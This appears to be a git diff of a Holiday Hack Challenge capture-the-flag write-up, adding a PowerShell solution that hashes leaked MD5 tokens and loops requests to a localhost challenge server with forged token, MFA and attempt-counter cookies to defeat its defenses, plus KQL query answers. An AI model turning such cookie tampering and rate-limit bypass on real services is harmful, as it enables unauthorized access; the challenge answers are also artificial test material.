@@ -3537,6 +3537,11 @@ Once HHC grants your achievement, you can close this terminal.
 > see if you can reliably reproduce the endpoint. This might help, pipe the 
 > tokens to Get-FileHash -Algorithm SHA256.
 
+```sh
+$credential = Get-Credential
+Invoke-WebRequest -AllowUnencryptedAuthentication -Uri http://localhost:1225/token_overview.csv -Credential $credential -OutFile token_overview.csv
+```
+
 Decided to start on the `token_overview.csv` file to see if we can produce a new
 one with the `REDACTED` entries updated with the appropriate `SHA256` hash.
 
@@ -3603,14 +3608,132 @@ cb722d0b55805cd6feffc22a9f68177d,REDACTED
 After downloading the file it's time to script this out.
 
 ```powershell
-$tokenCsv = Import-Csv './token_overview.csv'
+$tokenCsv = Import-Csv 'tokens.csv'
+$newTokenCsv = "new-token-file.csv"
+Write-Output 'file_MD5hash,Sha256(file_MD5hash)' | Out-File -FilePath "$newTokenCsv"
 
 foreach ($md5 in $tokenCsv.file_MD5hash) {
-    $hashStream = [IO.MemoryStream]::new([byte[]][char[]]$md5)
-    $sha256Hash = (Get-FileHash -InputStream $md5Stream -Algorithm SHA256).Hash
-    Write-Output ("$md5,$sha256Hash").ToLower() | Out-File -FilePath ./new-token-overview.csv -Append
+	if ($md5 -Match '^[0-9a-fA-F]{32}$') {
+		$hash = "$md5`n"
+		$hashAsStream = [IO.MemoryStream]::new()
+		$writer = [System.IO.StreamWriter]::new($hashAsStream)
+		$writer.write($hash)
+		$writer.Flush()
+		$hashAsStream.Position = 0
+
+		$sha256Hash = (Get-FileHash -InputStream $hashAsStream -Algorithm SHA256).Hash
+		Write-Output ("$md5,$sha256Hash").ToLower() | Out-File -FilePath $newTokenCsv -Append
+	} else {
+		Write-Output "$md5 is not an MD5 hash"
+	}
 }
 ```
+
+Here is the results in the `new-token-file.csv` file.
+
+```csv
+file_MD5hash,Sha256(file_MD5hash)
+04886164e5140175bafe599b7f1cacc8,dfd05f3b46d21bc8556cdbf544325a945ed0304ec0bb7dbfd68ed5931e7ff6ee
+664f52463ef97bcd1729d6de1028e41e,1f3c45d7e7b1f7621f67136c538c6933791d3392648c7b0f8b17fb1a6343ebd5
+3e03cd0f3d335c6fb50122553f63ef78,e2dbbdbcc7e57e526841899975b6621105710e76c203c1dc30419e7f1cba5297
+f2aeb18f5b3f08420eed9b548b6058c3,bc83a2c7a6279ead36370ab3509fea7483eff83c164fc7cfe3c680d879b9f9d2
+32b9401a6d972f8c1a98de145629ea9d,b93772d2393029424049564b366f08b21e66282ce3d7b9da4f7a69c8891012a0
+3a79238df0a92ab0afa44a85f914fc3b,989fde082fb901ae5edfd873bf41a76bf47b318f76968d0275dad99abd5894b4
+49c2a68b21b9982aa9fd64cf0fd79f72,e2b80b2c70ba5982814b758849472c8711af8051e5261ce827c02818d7e1de8c
+f8142c1304efb9b7e9a7f57363c2d286,704fecc829a3acb5e50e3277eafc03ca902e515cfd81bfa94670a44aca551d6a
+706457f6dd78729a8bed5bae1efaeb50,f5251b4ca89f3c4eb6bbcf40ad41abc870ffb8bfc4d1e170df7ed88f23e20568
+bb0564aa5785045937a35a9fa3fbbc73,a9fba920d17e1b98f393e691ec837a0ca41be8115389f2a634f77dceeaf20725
+4173a7bc22aee35c5fc48261b041d064,af2b19cc9cee8005c95a321605fb2aab8577c66ebd762cc2df943fee47987d86
+198b8bf2cd30a7c7fed464cca1720a88,0f8b6bd4b5d006bd7a0fceeba10a7726430ea9af7fa4314c0a83e17acaea32b6
+3a7c8ecffeeadb164c31559f8f24a1e7,38810a7bea5587438cbfa6a0c364619ca4f886ec403be951cf38f5158d7da4f9
+288e60e318d9ad7d70d743a614442ffc,a93f039a2d5158251d509afb2bf6bc45dec47d8ac189a170a23caea07f009476
+87ab4cb29649807fdb716ac85cf560ea,89298b15becc2f6c98c53ebfebf1c91d7d569cb0895b22f840bd3b9ca400e9f7
+89f3ec1275407c9526a645602d56e799,f6bc096e3570c6622ea951b3cfb852e116d0e1460576fb9fbe6f6b75dccb46c7
+33539252b40b5c244b09aee8a57adbc9,3877cd419e2d8907c09de27c68babfbcd88a9d8f7bebdb4385aff288d0a39631
+152899789a191d9e9150a1e3a5513b7f,1e257fca2443492c6b8621bee3117e9de40d6d6e1a7ca4861079fb74cb9dc164
+7cd48566f118a02f300cdfa75dee7863,ac7458460e359b3b940540168affc7fa354c3cc05a52a52a1a6de0538ae60ec8
+d798a55fca64118cea2df3c120f67569,65d70badac127dac0bcc4962107b708a37cf24b8dcd327c328a3c59a610f18ee
+6ef5570cd43a3ec9f43c57f662201e55,e2692776b6ecd2c39373ced96f7ff8b64aeae56404352cf06aefc724cc4c7cf1
+bf189d47c3175ada98af398669e3cac3,e433feb9de55166463e0bd4ba14a3cc099bd1ba1abf20fd290491bda3d3cf2e6
+743ac25389a0b430dd9f8e72b2ec9d7f,cf056ae6605f7909a7e6126716e528b863807d2dc153a4d5aa00714ac72aadc4
+270aabd5feaaf40185f2effa9fa2cd6e,f732a928cda0c4a51284f8b28401eac228ca2769804cfbcc16f2c8a0c58713f2
+8b58850ee66bd2ab7dd2f5f850c855f8,d2e0f89c295194775b9835f646f5bdd950eb05cb6d912602ce4ff62a30ebe437
+6fd00cbda10079b1d55283a88680d075,7a50d248e3991bf55c361e119faa292c8661f0eb6476c868db3289793391e12f
+612001dd92369a7750c763963bc327f0,bc9f1a7214052f7ad3fb5076a1862e24dc71808ba27c5d9c584d681f6c3afe6b
+010f2cc580f74521c86215b7374eead6,5bbe0d45c6a1fd01a7641ff4807009efc91fd7f5637dded8b71ad8e2ada5d086
+29860c67296d808bc6506175a8cbb422,8fcff56c3c425a8a7163493b1f17fb330ad89fbbefddd9c5d226196c4c327bbb
+7b7f6891b6b6ab46fe2e85651db8205f,f892f608096e56013c3ed96e4f984c6376617c42e328e20382660370ff181ce4
+45ffb41c4e458d08a8b08beeec2b4652,d040356e54ca166cd0479d9878fc9ba1012a80419a846a58a24649f4f01b63f8
+d0e6bfb6a4e6531a0c71225f0a3d908d,ff1a98e7bb3d9f87c4495ee7d62c455cbad6c6a6ad4abba25a503b7c1ae113c1
+bd7efda0cb3c6d15dd896755003c635c,6297f422314ea9e9172752f3a891bd505752c5f14fcab93153bcb1038fb5ab87
+5be8911ced448dbb6f0bd5a24cc36935,04519f7af02a977a27a8d9398e86354117537fa896c437019a61f46d31bfd339
+1acbfea6a2dad66eb074b17459f8c5b6,5a4b06401ad22fa4cf75fe22829cb14549c4f18a18c67beb16d314b80a4f44d9
+0f262d0003bd696550744fd43cd5b520,abf98108dbd1095a59bae36726fac48e3ab23da2cf2effeae02ef5c142cb76fe
+8cac896f624576d825564bb30c7250eb,2dda00da692764113b97787241658a1911aeb4c0bd9b92e4fab4ffcb1fe15a33
+8ef6d2e12a58d7ec521a56f25e624b80,ce92890075a6232a039bcb06b83adf90355119a99da8d694c85681e310191bb9
+b4959370a4c484c10a1ecc53b1b56a7d,ae311ebe101c6ac4e11e4e338906ecedc22583fad68b85834eed3cb684fc4383
+38bdd7748a70529e9beb04b95c09195d,acab8d777a0c5f9d631b4fe6e07cc14b7e063c1e48ee8a0ab876d12082ad3fea
+8d4366f08c013f5c0c587b8508b48b15,01b1f4132e95b847d89fcdc599fd685e26198aa684196663c4c0b51b1a410dc4
+67566692ca644ddf9c1344415972fba8,368ef0eb3bd563c81f658e6c47182524256f09212010774b00939a440dabd9f6
+8fbf4152f89b7e309e89b9f7080c7230,b3395dc1f995f897f36e5ab99b7a3eada186713cc40785bb33f06c4d7c989673
+936f4db24a290032c954073b3913f444,9992b3b85730ea436a546086036520bcf15d86b1a2a8f96e4d3c569148f770d3
+c44d8d6b03dcd4b6bf7cb53db4afdca6,35138166ced99d6a600b52f70c818cf44826170fd88b8234107ec0bd51cc276d
+cb722d0b55805cd6feffc22a9f68177d,15d6e335c167dea490ac4cd91815c56d7ecef3cd4b019588567710d839a9ea45
+724d494386f8ef9141da991926b14f9b,2ae009872b65d788e44f634736689af1570333fd802b93b41df09a3f7d02c0e1
+67c7aef0d5d3e97ad2488babd2f4c749,bac2f3580b6491cbf26c84f5dcf343d3f48557833c79cf3efb09f04be0e31b60
+5f8dd236f862f4507835b0e418907ffc,4216b4faf4391ee4d3e0ec53a372b2f24876ed5d124fe08e227f84d687a7e06c
+```
+
+```powershell
+$credential = Get-Credential
+$tokenCsv = Import-Csv -Path 'new-token-file.csv'
+foreach ($row in $tokenCsv) {
+	$tokenUrl = "http://localhost:1225/tokens/" + $row.Sha256Hash
+	$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
+	$token_cookie = New-Object System.Net.Cookie
+	$token_cookie.Name = "token"
+	$token_cookie.Value = $row.Md5Hash
+	$token_cookie.Domain = "localhost"
+	$session.cookies.Add($token_cookie);
+
+	$mfa_req = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri $tokenUrl -Credential $credential -WebSession $session
+	
+	$mfaUrl = "http://localhost:1225/mfa_validate/" + $row.sha256Hash
+	
+	$mfa_cookie = New-Object System.Net.Cookie
+	$mfa_cookie.Name = "mfa_token"
+	$mfa_cookie.Value = $mfa_req.Links.href
+	$mfa_cookie.Domain = "localhost"
+	$session.cookies.Add($mfa_cookie);
+	
+	$attempts_cookie = New-Object System.Net.Cookie
+	$attempts_cookie.Name = "attempts"
+	$attempts_cookie.Value = "c25ha2VvaWwK10"
+	$attempts_cookie.Domain = "localhost"
+	$session.cookies.Add($attempts_cookie);
+
+	$response = Invoke-WebRequest -AllowUnencryptedAuthentication -Uri $mfaUrl -Credential $credential -WebSession $session
+	
+	if ($response.Content -NotMatch "Error: Access Denied") {
+		$response.Content
+	}
+}
+```
+
+```html
+<h1>[+] Success, defense mechanisms deactivated.</h1><br>
+Administrator Token supplied, You are able to control the production and deployment of the snow cannons. May the best elves win: WombleysProductionLineShallPrevail</p>
+```
+
+> Incredible! You tackled the hard path and showed off some serious PowerShell 
+> expertise. This kind of skill is exactly what we need, especially with things 
+> heating up between the factions.
+>
+> Well done! you've demonstrated solid PowerShell skills and completed the 
+> challenge, giving us a bit of an edge. Your persistence and mastery are 
+> exactly what we need—keep up the great work!
+> 
+> **Piney Sappington (Front Yard (Act II))**
 
 ## Showball Showdown
 
@@ -4014,6 +4137,8 @@ we were good to go!
 90
 ```
 
+After entering that in I got a success!
+
 ### Question 4
 
 > You can use the where operator with the Employees table to locate a specific 
@@ -4106,7 +4231,14 @@ we're ready to go to the next question!
 
 ### Question 6
 
-> We can learn more about an elf by cross-referencing information from other tables. Let’s take a look at Angel Candysalt’s correspondence. First, retrieve her email address from the Employees table, and then use it in a query in the Email table.
+This question refers to cross referencing information from other tables. They
+want us to obtain Angel Candysalt's email from the `Employees` table and
+reference it to the `Email` table.
+
+> We can learn more about an elf by cross-referencing information from other 
+> tables. Let’s take a look at Angel Candysalt’s correspondence. First, retrieve 
+> her email address from the Employees table, and then use it in a query in the 
+> Email table.
 
 ```sql
 Email
@@ -4114,7 +4246,36 @@ Email
 | count
 ```
 
+We need to figure out how many emails Angel Candysalt recieved.
+
 **Question:** How many emails did Angel Candysalt receive?
+
+Cross referenced the `Employees` table for the `name` Angel Candysalt.
+
+```sql
+Employees
+| where name == "Angel Candysalt"
+```
+
+That outputs the following data. In the `email_addr` field is Angel's email
+address. Which is `angel_candysalt@santaworkshopgeeseislands.org`. This is what
+we'll need to continue with counting the emails.
+
+```json
+"hire_date": 2023-11-23T00:00:00.000Z,
+"name": Angel Candysalt,
+"user_agent": Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 10.0; Trident/5.0),
+"ip_addr": 10.10.0.6,
+"email_addr": angel_candysalt@santaworkshopgeeseislands.org,
+"username": ancandysalt,
+"role": Chief Reindeer Trainer,
+"hostname": Elf-Lap-A-Candysalt,
+"mfa_enabled": False,
+"company_domain": santaworkshopgeeseislands.org
+```
+
+Then we can do a lookup on the `Email` table for how many emails Angel Candysalt
+has recieved.
 
 ```sql
 Email
@@ -4122,15 +4283,24 @@ Email
 | count
 ```
 
+Based on the output below. There are `31` emails that Angel has recieved.
+
 | **Count** |
 |----------:|
 | 31 |
+
+Can copy the answer from the following code block.
 
 ```txt
 31
 ```
 
+Got a success when entering it into the answer box. So, we're ready to move on
+to the next question.
+
 ### Question 7
+
+In this they're having us go through the `distrinct` operator.
 
 > You can use the distinct operator to filter for unique values in a specific 
 > column.
@@ -4382,4 +4552,38 @@ In a nutshell. Santa isn't too happy about what's going on and needs a minute.
 > 
 > -- **Santa (Front Yard (Act III))**
 
+## Santa Vision
 
+## Elf Stack
+
+> Greetings! I'm the genius behind the North Pole Elf Stack SIEM. And oh boy, 
+> we’ve got a situation on our hands.
+> 
+> Our system was attacked—Wombley’s faction unleashed their FrostBit ransomware, 
+> and it’s caused a digital disaster.
+> 
+> The logs are a mess, and Wombley’s laptop—the only backup of the Naughty-Nice 
+> List—was smashed to pieces.
+> 
+> Now, it’s all up to you to help me trace the attack vectors and events. We 
+> need to figure out how this went down before it’s too late.
+> 
+> You’ll be using a containerized ELK stack or Linux CLI tools. Sounds like a 
+> fun little puzzle, doesn't it?
+> 
+> Your job is to analyze these logs... think of it as tracking snow tracks but 
+> in a digital blizzard.
+> 
+> If you can find the attack path, maybe we can salvage what’s left and get 
+> Santa’s approval.
+> 
+> Santa’s furious at the faction fighting, and he’s disappointed. We have to 
+> make things right.
+> 
+> So, let’s show these attackers that the North Pole’s defenses are no joke!
+> 
+> -- **Fitzy Shortstack (Front Yard (Act III))**
+
+
+
+## Decrypt The Naughty List
